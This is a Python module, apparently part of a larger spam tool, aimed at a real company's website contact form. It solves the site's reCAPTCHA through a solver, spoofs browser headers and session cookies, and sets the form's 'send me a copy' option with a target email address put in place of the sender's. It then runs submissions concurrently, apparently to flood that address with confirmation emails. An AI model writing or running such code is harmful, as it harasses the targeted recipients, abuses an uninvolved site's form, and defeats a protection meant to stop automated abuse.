from os.path import basename

import requests

from module import Spam

pageurl = 'https://www.sgt-oelsnitz.de/en/contact'
googlekey = '6LcLPiUUAAAAAKIkasm9ILbNGcGYhV9wohyv4smo'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cap = self.solve_captcha(pageurl, googlekey)
        if not cap:
            return

        cookies = {
            '02ac9764304a64c912fb0d9e572c61e3': 'en-GB',
            'f75d137e425d39402e77eea9ff5db390': '4u2p78h8onrqs1381moors8r77',
        }

        headers = {
            'authority': 'www.sgt-oelsnitz.de',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary34oMVj6YCyvzgmqY',
            # 'cookie': '02ac9764304a64c912fb0d9e572c61e3=en-GB; f75d137e425d39402e77eea9ff5db390=4u2p78h8onrqs1381moors8r77',
            'origin': 'https://www.sgt-oelsnitz.de',
            'pragma': 'no-cache',
            'referer': 'https://www.sgt-oelsnitz.de/en/contact',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        }

        data = '------WebKitFormBoundary34oMVj6YCyvzgmqY\r\nContent-Disposition: form-data; name="form1"\r\n\r\nsend\r\n------WebKitFormBoundary34oMVj6YCyvzgmqY\r\nContent-Disposition: form-data; name="feld1001001"\r\n\r\ntest\r\n------WebKitFormBoundary34oMVj6YCyvzgmqY\r\nContent-Disposition: form-data; name="feld1002006"\r\n\r\ntest\r\n------WebKitFormBoundary34oMVj6YCyvzgmqY\r\nContent-Disposition: form-data; name="feld1003002"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundary34oMVj6YCyvzgmqY\r\nContent-Disposition: form-data; name="feld1004003"\r\n\r\ntest\r\n------WebKitFormBoundary34oMVj6YCyvzgmqY\r\nContent-Disposition: form-data; name="feld1005004"\r\n\r\ntest\r\n------WebKitFormBoundary34oMVj6YCyvzgmqY\r\nContent-Disposition: form-data; name="feld2001005"\r\n\r\ntest\r\n------WebKitFormBoundary34oMVj6YCyvzgmqY\r\nContent-Disposition: form-data; name="mailcopy"\r\n\r\n1\r\n------WebKitFormBoundary34oMVj6YCyvzgmqY\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\ncap_que\r\n------WebKitFormBoundary34oMVj6YCyvzgmqY--\r\n'
        data = data.replace('cap_que', cap)
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text()).encode()
        for _ in range(10):
            try:
                response = requests.post('https://www.sgt-oelsnitz.de/en/contact', cookies=cookies, headers=headers, data=data)
                return response
            except Exception as e:
                pass
        return


def main():
    s = 'Thank you for Your Message.'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
